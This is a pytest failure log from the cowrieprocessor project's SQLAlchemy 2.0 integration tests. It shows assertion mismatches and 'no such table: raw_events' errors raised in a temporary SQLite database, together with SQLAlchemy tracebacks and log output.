E        +  where False = hasattr(Engine(sqlite:////tmp/tmppvhbxbbu.db), 'future')

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:50: AssertionError
__ TestCowrieDatabaseSQLAlchemy2Integration.test_optimize_method_sqlalchemy2 ___

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b4a7d150>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2a63350>

    def test_optimize_method_sqlalchemy2(self, cowrie_db):
        """Test optimize method with SQLAlchemy 2.0 patterns."""
        result = cowrie_db.optimize(vacuum=True, reindex=True)
    
        assert isinstance(result, dict)
>       assert 'operations_performed' in result
E       AssertionError: assert 'operations_performed' in {'final_size_mb': 0.0, 'initial_size_mb': 0.0, 'operations': ['VACUUM completed successfully', 'Reindexed 0 indexes'], 'reclaimed_mb': -0.0}

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:102: AssertionError
__ TestCowrieDatabaseSQLAlchemy2Integration.test_check_integrity_sqlalchemy2 ___

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b4a7d350>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2a63410>

    def test_check_integrity_sqlalchemy2(self, cowrie_db):
        """Test check_integrity method with SQLAlchemy 2.0 patterns."""
        result = cowrie_db.check_integrity(deep=False)
    
        assert isinstance(result, dict)
>       assert 'quick_check' in result
E       AssertionError: assert 'quick_check' in {'checks': {'foreign_keys': {'error': None, 'is_valid': True}, 'indexes': {'error': 'ok', 'is_valid': True}, 'quick_check': {'error': 'ok', 'is_valid': True}}, 'corruption_found': False, 'recommendations': []}

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:110: AssertionError
_ TestCowrieDatabaseSQLAlchemy2Integration.test_analyze_data_quality_sqlalchemy2 _

self = <sqlalchemy.engine.base.Connection object at 0x7756b26f0ad0>
dialect = <sqlalchemy.dialects.sqlite.pysqlite.SQLiteDialect_pysqlite object at 0x7756b277ac10>
context = <sqlalchemy.dialects.sqlite.base.SQLiteExecutionContext object at 0x7756b2768c00>
statement = <sqlalchemy.dialects.sqlite.base.SQLiteCompiler object at 0x7756b277bb10>
parameters = [()]

    def _exec_single_context(
        self,
        dialect: Dialect,
        context: ExecutionContext,
        statement: Union[str, Compiled],
        parameters: Optional[_AnyMultiExecuteParams],
    ) -> CursorResult[Any]:
        """continue the _execute_context() method for a single DBAPI
        cursor.execute() or cursor.executemany() call.
    
        """
        if dialect.bind_typing is BindTyping.SETINPUTSIZES:
            generic_setinputsizes = context._prepare_set_input_sizes()
    
            if generic_setinputsizes:
                try:
                    dialect.do_set_input_sizes(
                        context.cursor, generic_setinputsizes, context
                    )
                except BaseException as e:
                    self._handle_dbapi_exception(
                        e, str(statement), parameters, None, context
                    )
    
        cursor, str_statement, parameters = (
            context.cursor,
            context.statement,
            context.parameters,
        )
    
        effective_parameters: Optional[_AnyExecuteParams]
    
        if not context.executemany:
            effective_parameters = parameters[0]
        else:
            effective_parameters = parameters
    
        if self._has_events or self.engine._has_events:
            for fn in self.dispatch.before_cursor_execute:
                str_statement, effective_parameters = fn(
                    self,
                    cursor,
                    str_statement,
                    effective_parameters,
                    context,
                    context.executemany,
                )
    
        if self._echo:
            self._log_info(str_statement)
    
            stats = context._get_cache_stats()
    
            if not self.engine.hide_parameters:
                self._log_info(
                    "[%s] %r",
                    stats,
                    sql_util._repr_params(
                        effective_parameters,
                        batches=10,
                        ismulti=context.executemany,
                    ),
                )
            else:
                self._log_info(
                    "[%s] [SQL parameters hidden due to hide_parameters=True]",
                    stats,
                )
    
        evt_handled: bool = False
        try:
            if context.execute_style is ExecuteStyle.EXECUTEMANY:
                effective_parameters = cast(
                    "_CoreMultiExecuteParams", effective_parameters
                )
                if self.dialect._has_events:
                    for fn in self.dialect.dispatch.do_executemany:
                        if fn(
                            cursor,
                            str_statement,
                            effective_parameters,
                            context,
                        ):
                            evt_handled = True
                            break
                if not evt_handled:
                    self.dialect.do_executemany(
                        cursor,
                        str_statement,
                        effective_parameters,
                        context,
                    )
            elif not effective_parameters and context.no_parameters:
                if self.dialect._has_events:
                    for fn in self.dialect.dispatch.do_execute_no_params:
                        if fn(cursor, str_statement, context):
                            evt_handled = True
                            break
                if not evt_handled:
                    self.dialect.do_execute_no_params(
                        cursor, str_statement, context
                    )
            else:
                effective_parameters = cast(
                    "_CoreSingleExecuteParams", effective_parameters
                )
                if self.dialect._has_events:
                    for fn in self.dialect.dispatch.do_execute:
                        if fn(
                            cursor,
                            str_statement,
                            effective_parameters,
                            context,
                        ):
                            evt_handled = True
                            break
                if not evt_handled:
>                   self.dialect.do_execute(
                        cursor, str_statement, effective_parameters, context
                    )

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1967: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <sqlalchemy.dialects.sqlite.pysqlite.SQLiteDialect_pysqlite object at 0x7756b277ac10>
cursor = <sqlite3.Cursor object at 0x7756b273b940>
statement = '\n                        SELECT payload, COUNT(*) as count\n                        FROM raw_events\n               ... GROUP BY payload\n                        ORDER BY count DESC\n                        LIMIT 10\n                    '
parameters = ()
context = <sqlalchemy.dialects.sqlite.base.SQLiteExecutionContext object at 0x7756b2768c00>

    def do_execute(self, cursor, statement, parameters, context=None):
>       cursor.execute(statement, parameters)
E       sqlite3.OperationalError: no such table: raw_events

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/default.py:951: OperationalError

The above exception was the direct cause of the following exception:

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b464f5c0>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b26941b0>

    def test_analyze_data_quality_sqlalchemy2(self, cowrie_db):
        """Test analyze_data_quality method with SQLAlchemy 2.0 patterns."""
>       result = cowrie_db.analyze_data_quality(sample_size=10)

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:127: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:1106: in analyze_data_quality
    json_analysis = self._analyze_json_sample(sample_size)
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:1205: in _analyze_json_sample
    result = conn.execute(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1846: in _execute_context
    return self._exec_single_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1986: in _exec_single_context
    self._handle_dbapi_exception(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:2355: in _handle_dbapi_exception
    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1967: in _exec_single_context
    self.dialect.do_execute(
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <sqlalchemy.dialects.sqlite.pysqlite.SQLiteDialect_pysqlite object at 0x7756b277ac10>
cursor = <sqlite3.Cursor object at 0x7756b273b940>
statement = '\n                        SELECT payload, COUNT(*) as count\n                        FROM raw_events\n               ... GROUP BY payload\n                        ORDER BY count DESC\n                        LIMIT 10\n                    '
parameters = ()
context = <sqlalchemy.dialects.sqlite.base.SQLiteExecutionContext object at 0x7756b2768c00>

    def do_execute(self, cursor, statement, parameters, context=None):
>       cursor.execute(statement, parameters)
E       sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such table: raw_events
E       [SQL: 
E                               SELECT payload, COUNT(*) as count
E                               FROM raw_events
E                               WHERE payload IS NOT NULL AND payload != ''
E                               GROUP BY payload
E                               ORDER BY count DESC
E                               LIMIT 10
E                           ]
E       (Background on this error at: https://sqlalche.me/e/20/e3q8)

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/default.py:951: OperationalError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:18,524:INFO:cowrieprocessor.cli.cowrie_db:cowrie_db.py:analyze_data_quality:🔍 Starting data quality analysis...
2025-10-18 17:39:18,526:INFO:cowrieprocessor.cli.cowrie_db:cowrie_db.py:_analyze_database_overview:📊 Analyzing database overview...
2025-10-18 17:39:18,561:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:_analyze_database_overview:Could not count raw_events: (sqlite3.OperationalError) no such table: raw_events
[SQL: SELECT COUNT(*) FROM raw_events]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:18,562:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:_analyze_database_overview:Could not count session_summaries: (sqlite3.OperationalError) no such table: session_summaries
[SQL: SELECT COUNT(*) FROM session_summaries]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:18,562:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:_analyze_database_overview:Could not count command_stats: (sqlite3.OperationalError) no such table: command_stats
[SQL: SELECT COUNT(*) FROM command_stats]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:18,563:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:_analyze_database_overview:Could not count files: (sqlite3.OperationalError) no such table: files
[SQL: SELECT COUNT(*) FROM files]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:18,564:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:_analyze_database_overview:Could not count dead_letter_events: (sqlite3.OperationalError) no such table: dead_letter_events
[SQL: SELECT COUNT(*) FROM dead_letter_events]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:18,564:INFO:cowrieprocessor.cli.cowrie_db:cowrie_db.py:_analyze_database_overview:✅ Database overview: 0 total records
2025-10-18 17:39:18,564:INFO:cowrieprocessor.cli.cowrie_db:cowrie_db.py:_analyze_json_sample:🔍 Analyzing JSON payload sample (10 records)...
2025-10-18 17:39:18,566:ERROR:cowrieprocessor.cli.cowrie_db:cowrie_db.py:_analyze_json_sample:❌ JSON analysis failed: (sqlite3.OperationalError) no such table: raw_events
[SQL: 
                        SELECT payload, COUNT(*) as count
                        FROM raw_events
                        WHERE payload IS NOT NULL AND payload != ''
                        GROUP BY payload
                        ORDER BY count DESC
                        LIMIT 10
                    ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.cli.cowrie_db:cowrie_db.py:1100 🔍 Starting data quality analysis...
INFO     cowrieprocessor.cli.cowrie_db:cowrie_db.py:1137 📊 Analyzing database overview...
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:1150 Could not count raw_events: (sqlite3.OperationalError) no such table: raw_events
[SQL: SELECT COUNT(*) FROM raw_events]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:1150 Could not count session_summaries: (sqlite3.OperationalError) no such table: session_summaries
[SQL: SELECT COUNT(*) FROM session_summaries]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:1150 Could not count command_stats: (sqlite3.OperationalError) no such table: command_stats
[SQL: SELECT COUNT(*) FROM command_stats]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:1150 Could not count files: (sqlite3.OperationalError) no such table: files
[SQL: SELECT COUNT(*) FROM files]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:1150 Could not count dead_letter_events: (sqlite3.OperationalError) no such table: dead_letter_events
[SQL: SELECT COUNT(*) FROM dead_letter_events]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
INFO     cowrieprocessor.cli.cowrie_db:cowrie_db.py:1170 ✅ Database overview: 0 total records
INFO     cowrieprocessor.cli.cowrie_db:cowrie_db.py:1179 🔍 Analyzing JSON payload sample (10 records)...
ERROR    cowrieprocessor.cli.cowrie_db:cowrie_db.py:1300 ❌ JSON analysis failed: (sqlite3.OperationalError) no such table: raw_events
[SQL: 
                        SELECT payload, COUNT(*) as count
                        FROM raw_events
                        WHERE payload IS NOT NULL AND payload != ''
                        GROUP BY payload
                        ORDER BY count DESC
                        LIMIT 10
                    ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
_ TestCowrieDatabaseSQLAlchemy2Integration.test_repair_data_quality_sqlalchemy2 _

self = <sqlalchemy.engine.base.Connection object at 0x7756b269ec10>
dialect = <sqlalchemy.dialects.sqlite.pysqlite.SQLiteDialect_pysqlite object at 0x7756b3307110>
context = <sqlalchemy.dialects.sqlite.base.SQLiteExecutionContext object at 0x7756b2a5b680>
statement = <sqlalchemy.dialects.sqlite.base.SQLiteCompiler object at 0x7756b2763ed0>
parameters = [()]

    def _exec_single_context(
        self,
        dialect: Dialect,
        context: ExecutionContext,
        statement: Union[str, Compiled],
        parameters: Optional[_AnyMultiExecuteParams],
    ) -> CursorResult[Any]:
        """continue the _execute_context() method for a single DBAPI
        cursor.execute() or cursor.executemany() call.
    
        """
        if dialect.bind_typing is BindTyping.SETINPUTSIZES:
            generic_setinputsizes = context._prepare_set_input_sizes()
    
            if generic_setinputsizes:
                try:
                    dialect.do_set_input_sizes(
                        context.cursor, generic_setinputsizes, context
                    )
                except BaseException as e:
                    self._handle_dbapi_exception(
                        e, str(statement), parameters, None, context
                    )
    
        cursor, str_statement, parameters = (
            context.cursor,
            context.statement,
            context.parameters,
        )
    
        effective_parameters: Optional[_AnyExecuteParams]
    
        if not context.executemany:
            effective_parameters = parameters[0]
        else:
            effective_parameters = parameters
    
        if self._has_events or self.engine._has_events:
            for fn in self.dispatch.before_cursor_execute:
                str_statement, effective_parameters = fn(
                    self,
                    cursor,
                    str_statement,
                    effective_parameters,
                    context,
                    context.executemany,
                )
    
        if self._echo:
            self._log_info(str_statement)
    
            stats = context._get_cache_stats()
    
            if not self.engine.hide_parameters:
                self._log_info(
                    "[%s] %r",
                    stats,
                    sql_util._repr_params(
                        effective_parameters,
                        batches=10,
                        ismulti=context.executemany,
                    ),
                )
            else:
                self._log_info(
                    "[%s] [SQL parameters hidden due to hide_parameters=True]",
                    stats,
                )
    
        evt_handled: bool = False
        try:
            if context.execute_style is ExecuteStyle.EXECUTEMANY:
                effective_parameters = cast(
                    "_CoreMultiExecuteParams", effective_parameters
                )
                if self.dialect._has_events:
                    for fn in self.dialect.dispatch.do_executemany:
                        if fn(
                            cursor,
                            str_statement,
                            effective_parameters,
                            context,
                        ):
                            evt_handled = True
                            break
                if not evt_handled:
                    self.dialect.do_executemany(
                        cursor,
                        str_statement,
                        effective_parameters,
                        context,
                    )
            elif not effective_parameters and context.no_parameters:
                if self.dialect._has_events:
                    for fn in self.dialect.dispatch.do_execute_no_params:
                        if fn(cursor, str_statement, context):
                            evt_handled = True
                            break
                if not evt_handled:
                    self.dialect.do_execute_no_params(
                        cursor, str_statement, context
                    )
            else:
                effective_parameters = cast(
                    "_CoreSingleExecuteParams", effective_parameters
                )
                if self.dialect._has_events:
                    for fn in self.dialect.dispatch.do_execute:
                        if fn(
                            cursor,
                            str_statement,
                            effective_parameters,
                            context,
                        ):
                            evt_handled = True
                            break
                if not evt_handled:
>                   self.dialect.do_execute(
                        cursor, str_statement, effective_parameters, context
                    )

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1967: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <sqlalchemy.dialects.sqlite.pysqlite.SQLiteDialect_pysqlite object at 0x7756b3307110>
cursor = <sqlite3.Cursor object at 0x7756b2734a40>
statement = "\n                        SELECT COUNT(*) as total_missing\n                        FROM raw_events\n                ...OR event_timestamp IS NULL)\n                          AND payload IS NOT NULL AND payload != ''\n                    "
parameters = ()
context = <sqlalchemy.dialects.sqlite.base.SQLiteExecutionContext object at 0x7756b2a5b680>

    def do_execute(self, cursor, statement, parameters, context=None):
>       cursor.execute(statement, parameters)
E       sqlite3.OperationalError: no such table: raw_events

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/default.py:951: OperationalError

The above exception was the direct cause of the following exception:

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2764690>
batch_size = 100, dry_run = True

    def _repair_missing_fields(self, batch_size: int = 10000, dry_run: bool = True) -> Dict[str, Any]:
        """Backfill missing session_id, event_type, event_timestamp from JSON payload."""
        logger.info(f"🔧 {'Analyzing' if dry_run else 'Backfilling'} missing fields...")
    
        try:
            with self._get_engine().connect() as conn:
                # Check if columns are generated columns (cannot be updated)
                from ..db.migrations import _is_generated_column
    
                session_id_generated = _is_generated_column(conn, "raw_events", "session_id")
                event_type_generated = _is_generated_column(conn, "raw_events", "event_type")
                event_timestamp_generated = _is_generated_column(conn, "raw_events", "event_timestamp")
    
                logger.info(
                    f"Column status: session_id={'generated' if session_id_generated else 'regular'}, "
                    f"event_type={'generated' if event_type_generated else 'regular'}, "
                    f"event_timestamp={'generated' if event_timestamp_generated else 'regular'}"
                )
    
                # If all columns are generated, there's nothing to repair
                if session_id_generated and event_type_generated and event_timestamp_generated:
                    logger.info("✅ All columns are generated columns - no repair needed")
                    return {
                        'total_missing': 0,
                        'records_processed': 0,
                        'fields_backfilled': 0,
                        'session_id_updated': 0,
                        'event_type_updated': 0,
                        'event_timestamp_updated': 0,
                        'errors': 0,
                        'duration_seconds': 0,
                        'note': 'All columns are generated columns that auto-compute from JSON payload',
                    }
    
                # Find records with missing fields (only for non-generated columns)
                missing_conditions = []
                if not session_id_generated:
                    missing_conditions.append("session_id IS NULL")
                if not event_type_generated:
                    missing_conditions.append("event_type IS NULL")
                if not event_timestamp_generated:
                    missing_conditions.append("event_timestamp IS NULL")
    
                if not missing_conditions:
                    logger.info("✅ No non-generated columns need repair")
                    return {
                        'total_missing': 0,
                        'records_processed': 0,
                        'fields_backfilled': 0,
                        'session_id_updated': 0,
                        'event_type_updated': 0,
                        'event_timestamp_updated': 0,
                        'errors': 0,
                        'duration_seconds': 0,
                        'note': 'All columns are generated columns that auto-compute from JSON payload',
                    }
    
                where_clause = " OR ".join(missing_conditions)
    
                # Handle PostgreSQL JSON column comparison
                dialect_name = conn.dialect.name
                if dialect_name == "postgresql":
                    payload_not_empty = "AND payload IS NOT NULL"
                else:
                    payload_not_empty = "AND payload IS NOT NULL AND payload != ''"
    
                try:
>                   count_result = conn.execute(
                        text(f"""
                        SELECT COUNT(*) as total_missing
                        FROM raw_events
                        WHERE ({where_clause})
                          {payload_not_empty}
                    """)
                    ).fetchone()

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:1552: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1846: in _execute_context
    return self._exec_single_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1986: in _exec_single_context
    self._handle_dbapi_exception(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:2355: in _handle_dbapi_exception
    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1967: in _exec_single_context
    self.dialect.do_execute(
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <sqlalchemy.dialects.sqlite.pysqlite.SQLiteDialect_pysqlite object at 0x7756b3307110>
cursor = <sqlite3.Cursor object at 0x7756b2734a40>
statement = "\n                        SELECT COUNT(*) as total_missing\n                        FROM raw_events\n                ...OR event_timestamp IS NULL)\n                          AND payload IS NOT NULL AND payload != ''\n                    "
parameters = ()
context = <sqlalchemy.dialects.sqlite.base.SQLiteExecutionContext object at 0x7756b2a5b680>

    def do_execute(self, cursor, statement, parameters, context=None):
>       cursor.execute(statement, parameters)
E       sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such table: raw_events
E       [SQL: 
E                               SELECT COUNT(*) as total_missing
E                               FROM raw_events
E                               WHERE (session_id IS NULL OR event_type IS NULL OR event_timestamp IS NULL)
E                                 AND payload IS NOT NULL AND payload != ''
E                           ]
E       (Background on this error at: https://sqlalche.me/e/20/e3q8)

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/default.py:951: OperationalError

During handling of the above exception, another exception occurred:

self = <sqlalchemy.engine.base.Connection object at 0x7756b269ec10>
dialect = <sqlalchemy.dialects.sqlite.pysqlite.SQLiteDialect_pysqlite object at 0x7756b3307110>
context = <sqlalchemy.dialects.sqlite.base.SQLiteExecutionContext object at 0x7756b2a5b790>
statement = <sqlalchemy.dialects.sqlite.base.SQLiteCompiler object at 0x7756b2763b10>
parameters = [()]

    def _exec_single_context(
        self,
        dialect: Dialect,
        context: ExecutionContext,
        statement: Union[str, Compiled],
        parameters: Optional[_AnyMultiExecuteParams],
    ) -> CursorResult[Any]:
        """continue the _execute_context() method for a single DBAPI
        cursor.execute() or cursor.executemany() call.
    
        """
        if dialect.bind_typing is BindTyping.SETINPUTSIZES:
            generic_setinputsizes = context._prepare_set_input_sizes()
    
            if generic_setinputsizes:
                try:
                    dialect.do_set_input_sizes(
                        context.cursor, generic_setinputsizes, context
                    )
                except BaseException as e:
                    self._handle_dbapi_exception(
                        e, str(statement), parameters, None, context
                    )
    
        cursor, str_statement, parameters = (
            context.cursor,
            context.statement,
            context.parameters,
        )
    
        effective_parameters: Optional[_AnyExecuteParams]
    
        if not context.executemany:
            effective_parameters = parameters[0]
        else:
            effective_parameters = parameters
    
        if self._has_events or self.engine._has_events:
            for fn in self.dispatch.before_cursor_execute:
                str_statement, effective_parameters = fn(
                    self,
                    cursor,
                    str_statement,
                    effective_parameters,
                    context,
                    context.executemany,
                )
    
        if self._echo:
            self._log_info(str_statement)
    
            stats = context._get_cache_stats()
    
            if not self.engine.hide_parameters:
                self._log_info(
                    "[%s] %r",
                    stats,
                    sql_util._repr_params(
                        effective_parameters,
                        batches=10,
                        ismulti=context.executemany,
                    ),
                )
            else:
                self._log_info(
                    "[%s] [SQL parameters hidden due to hide_parameters=True]",
                    stats,
                )
    
        evt_handled: bool = False
        try:
            if context.execute_style is ExecuteStyle.EXECUTEMANY:
                effective_parameters = cast(
                    "_CoreMultiExecuteParams", effective_parameters
                )
                if self.dialect._has_events:
                    for fn in self.dialect.dispatch.do_executemany:
                        if fn(
                            cursor,
                            str_statement,
                            effective_parameters,
                            context,
                        ):
                            evt_handled = True
                            break
                if not evt_handled:
                    self.dialect.do_executemany(
                        cursor,
                        str_statement,
                        effective_parameters,
                        context,
                    )
            elif not effective_parameters and context.no_parameters:
                if self.dialect._has_events:
                    for fn in self.dialect.dispatch.do_execute_no_params:
                        if fn(cursor, str_statement, context):
                            evt_handled = True
                            break
                if not evt_handled:
                    self.dialect.do_execute_no_params(
                        cursor, str_statement, context
                    )
            else:
                effective_parameters = cast(
                    "_CoreSingleExecuteParams", effective_parameters
                )
                if self.dialect._has_events:
                    for fn in self.dialect.dispatch.do_execute:
                        if fn(
                            cursor,
                            str_statement,
                            effective_parameters,
                            context,
                        ):
                            evt_handled = True
                            break
                if not evt_handled:
>                   self.dialect.do_execute(
                        cursor, str_statement, effective_parameters, context
                    )

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1967: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <sqlalchemy.dialects.sqlite.pysqlite.SQLiteDialect_pysqlite object at 0x7756b3307110>
cursor = <sqlite3.Cursor object at 0x7756b27376c0>
statement = '\n                        SELECT COUNT(*) as total_missing\n                        FROM raw_events\n                ...vent_type IS NULL OR event_timestamp IS NULL)\n                          AND payload IS NOT NULL\n                    '
parameters = ()
context = <sqlalchemy.dialects.sqlite.base.SQLiteExecutionContext object at 0x7756b2a5b790>

    def do_execute(self, cursor, statement, parameters, context=None):
>       cursor.execute(statement, parameters)
E       sqlite3.OperationalError: no such table: raw_events

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/default.py:951: OperationalError

The above exception was the direct cause of the following exception:

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b44f57f0>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2764690>

    def test_repair_data_quality_sqlalchemy2(self, cowrie_db):
        """Test repair_data_quality method with SQLAlchemy 2.0 patterns."""
>       result = cowrie_db.repair_data_quality(batch_size=100, dry_run=True)

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:138: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:1439: in repair_data_quality
    backfill_result = self._repair_missing_fields(batch_size, dry_run)
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:1565: in _repair_missing_fields
    count_result = conn.execute(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1846: in _execute_context
    return self._exec_single_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1986: in _exec_single_context
    self._handle_dbapi_exception(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:2355: in _handle_dbapi_exception
    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1967: in _exec_single_context
    self.dialect.do_execute(
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <sqlalchemy.dialects.sqlite.pysqlite.SQLiteDialect_pysqlite object at 0x7756b3307110>
cursor = <sqlite3.Cursor object at 0x7756b27376c0>
statement = '\n                        SELECT COUNT(*) as total_missing\n                        FROM raw_events\n                ...vent_type IS NULL OR event_timestamp IS NULL)\n                          AND payload IS NOT NULL\n                    '
parameters = ()
context = <sqlalchemy.dialects.sqlite.base.SQLiteExecutionContext object at 0x7756b2a5b790>

    def do_execute(self, cursor, statement, parameters, context=None):
>       cursor.execute(statement, parameters)
E       sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such table: raw_events
E       [SQL: 
E                               SELECT COUNT(*) as total_missing
E                               FROM raw_events
E                               WHERE (session_id IS NULL OR event_type IS NULL OR event_timestamp IS NULL)
E                                 AND payload IS NOT NULL
E                           ]
E       (Background on this error at: https://sqlalche.me/e/20/e3q8)

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/default.py:951: OperationalError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:19,377:INFO:cowrieprocessor.cli.cowrie_db:cowrie_db.py:repair_data_quality:🔧 Starting data repair (dry run)...
2025-10-18 17:39:19,378:INFO:cowrieprocessor.cli.cowrie_db:cowrie_db.py:_repair_missing_fields:🔧 Analyzing missing fields...
